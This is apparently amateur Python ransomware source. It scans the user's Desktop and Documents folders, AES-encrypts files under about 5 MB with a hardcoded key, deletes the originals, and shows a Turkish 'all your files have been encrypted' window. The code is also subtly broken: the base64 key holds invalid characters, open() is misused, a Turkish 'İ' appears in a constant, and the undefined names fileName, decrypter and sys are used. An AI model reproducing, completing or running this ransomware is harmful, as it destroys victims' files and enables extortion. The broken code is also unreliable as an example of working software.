import os, pyaes, base64
from Tkinter import *

key = base64.b64decode('rJW3SD432daS3şilLmön32ıs32ıjdas==')
fileNames = []

userPath = os.path.expanduser('~') + os.sep

deskPath = userPath + "Desktop"
dockPath = userPath + "Documents"
paths = [deskPath, dockPath]

def scan(path):
    for root, dirs, files in os.walk(path, topdown=False):
        for file in files:
            filePath = os.path.join(root, file)
            if ".vkng" not in filePath:
                if os.path.getsize(filePath) < (2097152 * 5) / 2:
                    fileNames.append(filePath)

def encrypt(fileName, key):
    aes = pyaes.AESModeOfOperationCTR(key)
    
    try:
        fb = open(fileName, "rb").read()
        nb = aes.encrypt(fb)
        
        nf = open(fileName, ".vkng","wb")
        nf.write(nb)
        nf.flush()
        nf.close()
        os.remove(fileName)
    except:
        pass

def message():
    message = "Tüm Dosyalarınız Şifrelenmiştir"
    root = Tk()
    root.title('Tüm Dosyalarınız Şifrelenmiştir')
    
    text = Text()
    text.pack()
    
    text.insert("1.0", message)
    text.config(state=DİSABLED)
    root.mainloop()


def main():
    for path in paths:
        try:
            scan(path)
        except:
            pass
    
    if len(fileName) != 0:
        for fname in fileNames:
            encrypt(fname,key)
            pass
        
        file = open("decrypt.py","w")
        file.write(decrypter)
        file.close()
    else:
        sys.exit()

if __name__ == "__main__":
    main()
